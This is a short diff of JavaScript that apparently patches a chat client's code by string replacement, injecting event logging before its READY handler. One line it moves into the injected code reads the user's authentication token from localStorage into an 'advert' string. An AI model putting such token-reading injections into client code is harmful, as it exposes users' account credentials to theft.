@@ -253,12 +253,11 @@
 								const varname = fixedLogin.match(/...on\("disconnect"/g)[0].slice(0, 2);
 
 								console.log("varname", varname);
-
-								const advert = 'Made By CE1CECL! Your Token Is: ' + localStorage.getItem("token").toString();
 								
 								const fixedReady = fixedLogin.replace(
 									`switch(e){case"READY":`,
 									`if (e !== 'PRESENCE_UPDATE') console.log(e,t)
+		const advert = 'Made By CE1CECL! Your Token Is: ' + localStorage.getItem("token").toString();
 						switch(e){case"READY":
 t.user_guild_settings = t.user_guild_settings || [];
 t.sessions = t.sessions || [];
